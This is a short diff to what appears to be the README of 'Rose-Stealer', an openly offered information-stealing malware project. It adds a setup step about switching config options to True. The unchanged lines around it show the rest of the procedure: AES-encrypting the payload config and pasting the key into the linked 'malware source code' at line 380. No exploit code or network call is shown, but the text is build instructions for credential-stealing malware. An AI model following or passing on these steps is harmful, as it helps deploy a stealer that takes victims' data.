@@ -34,6 +34,7 @@
     # hexified 32 byte (128-bit AES key)
     shellcode_key=AES_KEY <--- Put the AES key here
     ```
+- Edit the config file and change the False statements accordingly to True for your needs.
 - Now encrypt the config file:
   - `python utils\aes_encrypt.py payload\config.ini payload\config.aes`
   - Put the output key you received into the [malware source code](https://github.com/0xRose/Rose-Stealer/blob/main/payload/main.py) on line 380:
